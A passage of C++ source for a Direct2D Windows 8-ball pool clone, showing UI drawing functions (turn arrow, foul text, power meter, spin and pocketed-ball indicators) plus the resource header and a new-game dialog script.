        oss2 << L"" ["" << player2Info.ballsPocketedCount << L""/7]"";
    }
    else {
        oss2 << L""(Undecided)"";
    }
    pRT->DrawText(oss2.str().c_str(), (UINT32)oss2.str().length(), pTextFormat, &p2Rect, pBrush);

    // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
    ID2D1SolidColorBrush* pArrowBrush = nullptr;
    pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
    if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
        float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
        float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
        float arrowTipX, arrowBackX;

        if (currentPlayer == 1) {
            // Player 1: Arrow left of P1 box, pointing right
            arrowBackX = p1Rect.left - 15.0f; // Position left of the box
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
            // Define points for right-pointing arrow
            D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
            D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
            D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(pt2);
                    pSink->AddLine(pt3);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }
        }
        else { // Player 2
         // Player 2: Arrow left of P2 box, pointing right (or right of P2 box pointing left?)
         // Let's keep it consistent: Arrow left of the active player's box, pointing right.
            arrowBackX = p2Rect.left - 15.0f; // Position left of the box
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
            // Define points for right-pointing arrow
            D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
            D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
            D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(pt2);
                    pSink->AddLine(pt3);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }
        }
        SafeRelease(&pArrowBrush);
    }


    // --- MODIFIED: Foul Text (Large Red, Bottom Center) ---
    if (foulCommitted && currentGameState != SHOT_IN_PROGRESS) {
        ID2D1SolidColorBrush* pFoulBrush = nullptr;
        pRT->CreateSolidColorBrush(FOUL_TEXT_COLOR, &pFoulBrush);
        if (pFoulBrush && pLargeTextFormat) {
            // Calculate Rect for bottom-middle area
            float foulWidth = 200.0f; // Adjust width as needed
            float foulHeight = 60.0f;
            float foulLeft = TABLE_LEFT + (TABLE_WIDTH / 2.0f) - (foulWidth / 2.0f);
            // Position below the pocketed balls bar
            float foulTop = pocketedBallsBarRect.bottom + 10.0f;
            D2D1_RECT_F foulRect = D2D1::RectF(foulLeft, foulTop, foulLeft + foulWidth, foulTop + foulHeight);

            // --- Set text alignment to center for foul text ---
            pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

            pRT->DrawText(L""FOUL!"", 5, pLargeTextFormat, &foulRect, pFoulBrush);

            // --- Restore default alignment for large text if needed elsewhere ---
            // pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
            // pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

            SafeRelease(&pFoulBrush);
        }
    }

    // Show AI Thinking State (Unchanged from previous step)
    if (currentGameState == AI_THINKING && pTextFormat) {
        ID2D1SolidColorBrush* pThinkingBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pThinkingBrush);
        if (pThinkingBrush) {
            D2D1_RECT_F thinkingRect = p2Rect;
            thinkingRect.top += 20; // Offset within P2 box
            // Ensure default text alignment for this
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
            pRT->DrawText(L""Thinking..."", 11, pTextFormat, &thinkingRect, pThinkingBrush);
            SafeRelease(&pThinkingBrush);
        }
    }

    SafeRelease(&pBrush);
}

void DrawPowerMeter(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pBorderBrush = nullptr;
    ID2D1SolidColorBrush* pFillBrush = nullptr;

    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LimeGreen), &pFillBrush);

    if (!pBorderBrush || !pFillBrush) {
        SafeRelease(&pBorderBrush);
        SafeRelease(&pFillBrush);
        return;
    }

    // Draw Border
    pRT->DrawRectangle(&powerMeterRect, pBorderBrush, 1.0f);

    // Calculate Fill Height
    float fillRatio = 0;
    if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
        fillRatio = shotPower / MAX_SHOT_POWER;
    }
    float fillHeight = (powerMeterRect.bottom - powerMeterRect.top) * fillRatio;
    D2D1_RECT_F fillRect = D2D1::RectF(
        powerMeterRect.left, powerMeterRect.bottom - fillHeight,
        powerMeterRect.right, powerMeterRect.bottom
    );

    // Draw Fill
    pRT->FillRectangle(&fillRect, pFillBrush);

    SafeRelease(&pBorderBrush);
    SafeRelease(&pFillBrush);
}

void DrawSpinIndicator(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pWhiteBrush = nullptr;
    ID2D1SolidColorBrush* pRedBrush = nullptr;

    pRT->CreateSolidColorBrush(CUE_BALL_COLOR, &pWhiteBrush);
    pRT->CreateSolidColorBrush(ENGLISH_DOT_COLOR, &pRedBrush);

    if (!pWhiteBrush || !pRedBrush) {
        SafeRelease(&pWhiteBrush);
        SafeRelease(&pRedBrush);
        return;
    }

    // Draw White Ball Background
    D2D1_ELLIPSE bgEllipse = D2D1::Ellipse(spinIndicatorCenter, spinIndicatorRadius, spinIndicatorRadius);
    pRT->FillEllipse(&bgEllipse, pWhiteBrush);
    pRT->DrawEllipse(&bgEllipse, pRedBrush, 0.5f); // Thin red border


    // Draw Red Dot for Spin Position
    float dotRadius = 4.0f;
    float dotX = spinIndicatorCenter.x + cueSpinX * (spinIndicatorRadius - dotRadius); // Keep dot inside edge
    float dotY = spinIndicatorCenter.y + cueSpinY * (spinIndicatorRadius - dotRadius);
    D2D1_ELLIPSE dotEllipse = D2D1::Ellipse(D2D1::Point2F(dotX, dotY), dotRadius, dotRadius);
    pRT->FillEllipse(&dotEllipse, pRedBrush);

    SafeRelease(&pWhiteBrush);
    SafeRelease(&pRedBrush);
}


void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT) {
    ID2D1SolidColorBrush* pBgBrush = nullptr;
    ID2D1SolidColorBrush* pBallBrush = nullptr;

    // Ensure render target is valid before proceeding
    if (!pRT) return;

    HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black, 0.8f), &pBgBrush); // Semi-transparent black
    if (FAILED(hr)) { SafeRelease(&pBgBrush); return; } // Exit if brush creation fails

    hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBallBrush); // Placeholder, color will be set per ball
    if (FAILED(hr)) {
        SafeRelease(&pBgBrush);
        SafeRelease(&pBallBrush);
        return; // Exit if brush creation fails
    }

    // Draw the background bar (rounded rect)
    D2D1_ROUNDED_RECT roundedRect = D2D1::RoundedRect(pocketedBallsBarRect, 10.0f, 10.0f); // Corner radius 10
    pRT->FillRoundedRectangle(&roundedRect, pBgBrush);

    // --- Draw small circles for pocketed balls inside the bar ---

    // Calculate dimensions based on the bar's height for better scaling
    float barHeight = pocketedBallsBarRect.bottom - pocketedBallsBarRect.top;
    float ballDisplayRadius = barHeight * 0.30f; // Make balls slightly smaller relative to bar height
    float spacing = ballDisplayRadius * 2.2f; // Adjust spacing slightly
    float padding = spacing * 0.75f; // Add padding from the edges
    float center_Y = pocketedBallsBarRect.top + barHeight / 2.0f; // Vertical center

    // Starting X positions with padding
    float currentX_P1 = pocketedBallsBarRect.left + padding;
    float currentX_P2 = pocketedBallsBarRect.right - padding; // Start from right edge minus padding

    int p1DrawnCount = 0;
    int p2DrawnCount = 0;
    const int maxBallsToShow = 7; // Max balls per player in the bar

    for (const auto& b : balls) {
        if (b.isPocketed) {
            // Skip cue ball and 8-ball in this indicator
            if (b.id == 0 || b.id == 8) continue;

            bool isPlayer1Ball = (player1Info.assignedType != BallType::NONE && b.type == player1Info.assignedType);
            bool isPlayer2Ball = (player2Info.assignedType != BallType::NONE && b.type == player2Info.assignedType);

            if (isPlayer1Ball && p1DrawnCount < maxBallsToShow) {
                pBallBrush->SetColor(b.color);
                // Draw P1 balls from left to right
                D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P1 + p1DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                pRT->FillEllipse(&ballEllipse, pBallBrush);
                p1DrawnCount++;
            }
            else if (isPlayer2Ball && p2DrawnCount < maxBallsToShow) {
                pBallBrush->SetColor(b.color);
                // Draw P2 balls from right to left
                D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P2 - p2DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                pRT->FillEllipse(&ballEllipse, pBallBrush);
                p2DrawnCount++;
            }
            // Note: Balls pocketed before assignment or opponent balls are intentionally not shown here.
            // You could add logic here to display them differently if needed (e.g., smaller, grayed out).
        }
    }

    SafeRelease(&pBgBrush);
    SafeRelease(&pBallBrush);
}

void DrawBallInHandIndicator(ID2D1RenderTarget* pRT) {
    if (!isDraggingCueBall && (currentGameState != BALL_IN_HAND_P1 && currentGameState != BALL_IN_HAND_P2 && currentGameState != PRE_BREAK_PLACEMENT)) {
        return; // Only show when placing/dragging
    }

    Ball* cueBall = GetCueBall();
    if (!cueBall) return;

    ID2D1SolidColorBrush* pGhostBrush = nullptr;
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.6f), &pGhostBrush); // Semi-transparent white

    if (pGhostBrush) {
        D2D1_POINT_2F drawPos;
        if (isDraggingCueBall) {
            drawPos = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
        }
        else {
            // If not dragging but in placement state, show at current ball pos
            drawPos = D2D1::Point2F(cueBall->x, cueBall->y);
        }

        // Check if the placement is valid before drawing differently?
        bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
        bool isValid = IsValidCueBallPosition(drawPos.x, drawPos.y, behindHeadstring);

        if (!isValid) {
            // Maybe draw red outline if invalid placement?
            pGhostBrush->SetColor(D2D1::ColorF(D2D1::ColorF::Red, 0.6f));
        }


        D2D1_ELLIPSE ghostEllipse = D2D1::Ellipse(drawPos, BALL_RADIUS, BALL_RADIUS);
        pRT->FillEllipse(&ghostEllipse, pGhostBrush);
        pRT->DrawEllipse(&ghostEllipse, pGhostBrush, 1.0f); // Outline

        SafeRelease(&pGhostBrush);
    }
}
```

==++ Here's the full source for (file 2/3 (No OOP-based)) ""resource.h""::: ++==
```resource.h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Yahoo-8Ball-Pool-Clone.rc
//
#define IDI_ICON1                       101
// --- NEW Resource IDs (Define these in your .rc file / resource.h) ---
#define IDD_NEWGAMEDLG 106
#define IDC_RADIO_2P   1003
#define IDC_RADIO_CPU  1005
#define IDC_GROUP_AI   1006
#define IDC_RADIO_EASY 1007
#define IDC_RADIO_MEDIUM 1008
#define IDC_RADIO_HARD 1009
// Standard IDOK is usually defined, otherwise define it (e.g., #define IDOK 1)

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

==++ Here's the full source for (file 3/3 (No OOP-based)) ""Yahoo-8Ball-Pool-Clone.rc""::: ++==
```Yahoo-8Ball-Pool-Clone.rc
// Microsoft Visual C++ generated resource script.
//
#include ""resource.h""

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include ""winres.h""

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    ""resource.h\0""
END

2 TEXTINCLUDE 
BEGIN
    ""#include """"winres.h""""\r\n""
    ""\0""
END

3 TEXTINCLUDE 
BEGIN
    ""\r\n""
    ""\0""
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    ""D:\\Download\\cpp-projekt\\FuzenOp_SiloTest\\icons\\shell32_277.ico""

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED

#include <windows.h> // Needed for control styles like WS_GROUP, BS_AUTORADIOBUTTON etc.

/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//

IDD_NEWGAMEDLG DIALOGEX 0, 0, 220, 130 // Dialog position (x, y) and size (width, height) in Dialog Units (DLUs)
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION ""New 8-Ball Game""
FONT 8, ""MS Shell Dlg"", 400, 0, 0x1 // Standard dialog font
BEGIN
// --- Game Mode Selection ---
// Group Box for Game Mode (Optional visually, but helps structure)
GROUPBOX        ""Game Mode"", IDC_STATIC, 7, 7, 90, 50

// ""2 Player"" Radio Button (First in this group)
CONTROL         ""&2 Player (Human vs Human)"", IDC_RADIO_2P, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 14, 20, 80, 10

// ""Human vs CPU"" Radio Button
CONTROL         ""Human vs &CPU"", IDC_RADIO_CPU, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 14, 35, 70, 10


// --- AI Difficulty Selection (Inside its own Group Box) ---
GROUPBOX        ""AI Difficulty"", IDC_GROUP_AI, 118, 7, 95, 70

// ""Easy"" Radio Button (First in the AI group)
CONTROL         ""&Easy"", IDC_RADIO_EASY, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 20, 60, 10

// ""Medium"" Radio Button
CONTROL         ""&Medium"", IDC_RADIO_MEDIUM, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 35, 60, 10

// ""Hard"" Radio Button
CONTROL         ""&Hard"", IDC_RADIO_HARD, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 50, 60, 10


// --- Standard Buttons ---
DEFPUSHBUTTON   ""Start"", IDOK, 55, 105, 50, 14 // Default button (Enter key)
PUSHBUTTON      ""Cancel"", IDCANCEL, 115, 105, 50, 14
END
```"
